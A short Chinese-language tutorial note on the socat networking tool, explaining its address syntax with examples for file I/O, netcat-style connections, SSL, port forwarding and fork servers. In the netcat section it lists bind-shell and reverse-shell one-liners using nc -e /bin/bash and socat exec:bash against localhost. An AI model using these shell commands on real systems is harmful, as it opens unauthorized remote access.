---
title: "socat"
date: 2016-12-01 10:24
update: 2015-12-02 16:00
collection: "网络(抓包/代理)"
---

TODO

socat，是linux下的一个工具，其功能与有“瑞士军刀”之称的netcat类似，不过据说可以看做netcat的加强版。

## 语法 ##

```
socat [options] <address> <address>
```
其中这2个address就是关键了，如果要解释的话，address就类似于一个文件描述符，socat所做的工作就是在2个address指定的描述符间建立一个pipe用于发送和接收数据。

那么address的描述就是socat的精髓所在了，几个常用的描述方式如下：

+ -,STDIN,STDOUT ：表示标准输入输出，可以就用一个横杠代替
+ /var/log/syslog : 也可以是任意路径，如果是相对路径要使用./，打开一个文件作为数据流。
+ TCP:: : 建立一个TCP连接作为数据流，TCP也可以替换为UDP
+ TCP-LISTEN: : 建立TCP监听端口，TCP也可以替换为UDP
+ EXEC: : 执行一个程序作为数据流。

以上规则中前面的TCP等都可以小写。

在这些描述后可以附加一些选项，用逗号隔开，如fork，reuseaddr，stdin，stdout，ctty等。

## 使用举例

### socat当cat

直接回显
```
socat - -
```

cat文件
```
socat - /home/user/chuck
```

写文件
```
echo "hello" | socat - /home/user/chuck
```

### socat当netcat

连接远程端口
```
nc localhost 80
socat - TCP:localhost:80
```

监听端口
```
nc -lp localhost 700
socat TCP-LISTEN:700 -
```

正向shell
```
nc -lp localhost 700 -e /bin/bash
socat TCP-LISTEN:700 EXEC:/bin/bash
```

反弹shell
```
nc localhost 700 -e /bin/bash
socat tcp-connect:localhost:700 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

### 代理与转发

将本地80端口转发到远程的80端口
```
socat TCP-LISTEN:80,fork TCP:www.domain.org:80
```

### SSL连接

SSL服务器
```
socat OPENSSL-LISTEN:443,cert=/cert.pem -
```
需要首先生成证书文件

SSL客户端
```
socat - OPENSSL:localhost:443
```

### fork服务器

可以将一个使用标准输入输出的单进程程序变为一个使用fork方法的多进程服务
```
socat TCP-LISTEN:1234,reuseaddr,fork EXEC:./helloworld
```

## 参考

+ [socat简介](http://brieflyx.me/2015/linux-tools/socat-introduction/)
